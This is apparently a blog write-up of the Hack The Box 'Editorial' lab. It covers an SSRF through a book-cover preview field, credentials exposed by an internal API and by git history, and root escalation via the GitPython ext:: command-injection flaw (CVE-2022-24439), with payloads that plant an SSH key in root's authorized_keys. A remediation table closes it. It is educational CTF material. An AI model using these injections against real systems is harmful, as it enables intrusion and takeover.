--- 
title: "Hack the Box (HTB) - Editorial"
description: "SSRF, Git, & Deprecated GitPython Library "
date: 2024-08-13 12:00:00 -100
image: /assets/images/HTB - Editorial/Editorial HTB.jpg
categories: [CTF]
tags: [ssrf, git, gitpython, outdated library ]    # TAG names should always be lowercase
---

## Enumeration

Let's run an [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan against our target at `10.10.11.23`

We see the following ports open:

![namp scan](/assets/images/HTB%20-%20Editorial/nmap%20scan%20editorial.png)

The classic duo of 22 & 80. Let's start by checking the nginx web server. First we need to add the domain to our `/etc/hosts` file as indicated by the nmap scan `Did not follow redirect to http://editorial.htb`. This indicates some virtual hosting is happening.

![etchosts](/assets/images/HTB%20-%20Editorial/etchosts%20editorial.png)

Now that we added `editorial.htb` to our local dns file we can navigate to the site web server

![web server](/assets/images/HTB%20-%20Editorial/Web%20server%20editorial.png)

Let's take a look around, shall we

![upload ability discovered](/assets/images/HTB%20-%20Editorial/upload%20found.png)

We find this upload section, which could be juicy. Our gobuster scan confirms the finding

![dirbuster](/assets/images/HTB%20-%20Editorial/upload%20directory.png)


Uploading a file & checking the request in burp gives some interesting results

![NoUpload](/assets/images/HTB%20-%20Editorial/No%20Upload.png)

As shown from the picture, my upload goes nowhere and just returns me to the same page

![Wappalyzer](/assets/images/HTB%20-%20Editorial/Wappalyzer.png)

Checking Wappalyzer, we see that the site is utilizing a Nginx web server that's serving Hugo. Hugo is a static site generator (similar to the one I am using for this blog), which means there's no backend DB or server side programming

I notice a `preview` button next to the book information that allows a URL to be entered

![Cover URL](/assets/images/HTB%20-%20Editorial/Cover%20URL%20section.png)

Let's fire up a nc listener & enter our IP/port and hit the preview button

![SSRF](/assets/images/HTB%20-%20Editorial/SSRF.png)

Nice, so we have confirmed SSRF through this cover url & preview. With SSRF, we're effectively tricking the server into making requests our behalf. With this vulnerability, we can try to access internal resources we normally wouldn't be able to access

![Initial Request](/assets/images/HTB%20-%20Editorial/Initial%20Request.png)

This is the initial request from the preview button. We can change out `test` for `http://localhost:1` for now. We'll be using Burpsuite's intruder tab to fuzz for common internal services

![Intruder](/assets/images/HTB%20-%20Editorial/Intruder%20-%20Copy.png)

We have our attack type set to `sniper` and our position targeted. Let's head over to payloads

![Payload Settings](/assets/images/HTB%20-%20Editorial/Payload%20settings.png)

I choose these ports as they are common to internal services that run internally

![Port 5000](/assets/images/HTB%20-%20Editorial/5000.png)

Port 5000 gives us a length of 222 which is different. Let's check out the response

![Response](/assets/images/HTB%20-%20Editorial/5000%20Response.png)

Let's check the url

![Internal Resource](/assets/images/HTB%20-%20Editorial/Internal%20Resource.png)

Awesome, we received a file through the SSRF vulnerability.

![File](/assets/images/HTB%20-%20Editorial/File.png)

```json
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

The JSON file contains various API endpoints on the server. These are URLs the web app uses to perform specific functions (retrieving promotions or checking the latest version etc)

Breaking down that list we see the following endpoints

```plaintext
/api/latest/metadata/messages/promos
/api/latest/metadata/messages/coupons
/api/latest/metadata/messages/authors
/api/latest/metadata/messages/how_to_use_platform
/api/latest/metadata/changelog
/api/latest/metadata
```

Let's check out these requests

![API Request](/assets/images/HTB%20-%20Editorial/API%20Request.png)

We can right click on the broken preview image to open. Judging by the name of the endpoints themselves, let's start with `/api/latest/metadata/messages/authors`

![Authors](/assets/images/HTB%20-%20Editorial/API%20Authers%20Request.png)

Nice, the JSON data we receive is a welcome email that includes login creds for an internal form

- Username: `dev`
- Passowrd: `dev080217_devAPI!@`

Let's try to ssh with these creds

![User Login](/assets/images/HTB%20-%20Editorial/User%20SSH%20Obtained.png)

Boom, we have user access to the box. As always, let's do some system / user enumeration

| **Category**                     | **Command**                      | **Result**                         |
|----------------------------------|-----------------------------------|------------------------------------|
| Current User & Group Perms (ID)  | `id`                              | `uid=1001(dev) gid=1001(dev) groups=1001(dev)` |
| Kernel Version                   | `uname -r`                        | `5.15.0-112-generic`               |
| SUDO Permissions                 | `sudo -l`                         | `User dev may not run sudo on editorial` |
| SUID Binaries                    | `find / -perm 4000 2>/dev/null`   |     test,test                |
| Services Running                 | `netstat -antup`                  | `tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN -` |
| Cron Jobs                        | `ls -la /etc/cron.d`              |  e2scrub_all            |
| Writable Directories             | `find / -perm -2 -type d 2>/dev/null` | /run/screen /run/lock /dev/mqueue /dev/shm /var/crash /var/tmp /tmp /tmp/.X11-unix /tmp/.ICE-unix /tmp/ .Test-unix /tmp/.font-unix /tmp/.XIM-unix |
| Check for Passwords              | `grep -Ri 'password' /etc/ 2>/dev/null` | Nothing of value |
| Environment Variables            | `printenv`                        | Nothing of value         |
| PATH                             | `echo $PATH`                      | /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 | 

Nothing of use from the initial enumeration. However, checking our home folder we do see an `apps` directory

![apps](/assets/images/HTB%20-%20Editorial/apps.png)

Looking trough this directory leads me to a config file. Checking the contents, we see the following

![Config](/assets/images/HTB%20-%20Editorial/Config.png)

Not super useful, lets' look elsewhere

![Master Log](/assets/images/HTB%20-%20Editorial/Master%20log.png)

We find a file called `.git/logs/refs/heads/master`. This contains all the commits made to the `master` branch. Let's take a look

```bash
cat master
```

![Downgrading Prod to Dev](/assets/images/HTB%20-%20Editorial/Downgrading%20prod%20to%20dev.png)

We see this commit that says "downgraded prod to dev". We can look at the commit by typing the following command

```bash
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

![Prod Creds](/assets/images/HTB%20-%20Editorial/Prod%20Creds.png)

Very nice, we get the following commit information 

| **Attribute**          | **Details**                                                                                      |
|------------------------|--------------------------------------------------------------------------------------------------|
| **Commit Hash**        | `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae`                                                       |
| **Author**             | `dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>`                                  |
| **Date**               | `Sun Apr 30 20:55:08 2023 -0500`                                                                 |
| **Commit Message**     | `change(api): downgrading prod to dev`                                                            |
| **Description**        | * To use development environment.                                                                |
| **File Modified**      | `app_api/app.py`                                                                                  |
| **Changes**            | - Updated credentials in `template_mail_message` from production to development.                  |
| **Production Credentials** | `Username: prod`, `Password: 080217_Producti0n_2023!@`                                      |
| **Development Credentials** | `Username: dev`, `Password: dev080217_devAPI!@`                                              |

The commit **b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae** made a modification to `ap_api/app.py` which changes the template_mail_message to generate a welcome email for new authors

We now have the production credentials

```bash
su prod
```

Running a `sudo -l` as prod shows the following permission

![Sudo permission on prod](/assets/images/HTB%20-%20Editorial/Sudo%20-L%20Prod.png)

The output tells us prod may run `/usr/bin/python3`  & `/opt/ internal_apps/clone_changes/clone_prod_change.py *`

Let's take a look at the python script

```bash
cat /opt/internal_apps/clone_changes/clone_prod_change.py
```

![Script](/assets/images/HTB%20-%20Editorial/Script.png)

This script:
- Changes the working directory to `/opt/internal_apps/clone_changes`
- Takes a URL as a argument
- Initializes an empty git repo in the current directory
- Clones a git repo from the given URL into a folder named `new_changes`

Let's check the modules

- `os` module provides us with abilities to interact with the OS
We will check
- `sys` provides access to some variables used by the python interpreter. In our script, it's used to access command-line arguments `sys.argv`
- The `repo` class from the `git` module is part of the GitPython library

Modules are individual files containing code, and libraries are collections of modules & specific versions of a module or library can have vulnerabilities

```bash
pip show gitpython
```

![gitpython version](/assets/images/HTB%20-%20Editorial/GitPython%20version.png)

Doing a quick search for **gitpython 3.1.29 exploit** brings me to [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) that states *All versions of package gitpython are vulnerable to Remote Code Execution (RCE) due to improper user input validation*

The exploit is in how `r.clone_from` method uses the `ext` transport protocol. Since ext transport protocol allows git to execute arbitrary commands through a URL with the `ext::` prefix, the protocol is a vector for command injection if user input is not sanitized. The `r.clone_from` method in GitPython uses Git to perform the cloning operation, including handling the URL provided

The vulnerable code in question is listed below ( found [Here](https://github.com/gitpython-developers/GitPython/blob/bec61576ae75803bc4e60d8de7a629c194313d1c/git/repo/base.py#L1249))

```python
# Vulnerable Code

  def clone_from(
    cls,
    url: PathLike,
    to_path: PathLike,
    progress: Optional[Callable] = None,
    env: Optional[Mapping[str, str]] = None,
    multi_options: Optional[List[str]] = None,
    **kwargs: Any,
) -> "Repo":
    # ...
    git = cls.GitCommandWrapperType(os.getcwd())
    if env is not None:
        git.update_environment(**env)
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
```

The `url: Pathlike` parameter doesn't impose any restrictions on the types of URLs that can be passed

Let's try to exploit this by create a simple text file

```bash
sudo -u root /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```

![POC](/assets/images/HTB%20-%20Editorial/POC.png)

Great, we can write / read files as root. We could use this to simply read the root flag, but we can easily get a shell by generating an SSH key and placing the public key in root's authorized keys, effectively giving us SSH availability as root

```bash
ssh-keygen -t rsa -b 4096 -f pwned_key
```

Now append the public key to root's authorized keys.

```bash
sudo -u root /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /home/prod/pwned_key.pub% >>% /root/.ssh/authorized_keys'
```

Now let's ssh as root!

```bash
ssh -i /home/prod/pwned_key root@localhost
```

![root](/assets/images/HTB%20-%20Editorial/Root%20Editorial.png)

GG, we've rooted editorial!

### Remediation

| **Vulnerability**               | **Mitigation**                                                                                                               |
|---------------------------------|------------------------------------------------------------------------------------------------------------------------------|
| **SSRF (Server-Side Request Forgery)** | Implement strict input validation and sanitization to prevent unauthorized internal requests. Use URL whitelisting and ensure internal services are not accessible from the public. |
| **Vulnerable GitPython Version** | Regularly update dependencies to their latest secure versions. Apply patches for known vulnerabilities and review library security advisories.                                 |


### References

- [OWASP Top Ten: Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) - This guide helps understand the importance of protecting sensitive data.

- [CVE-2022-24439: GitPython Remote Code Execution](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) - Details on the vulnerability in GitPython and its impact.
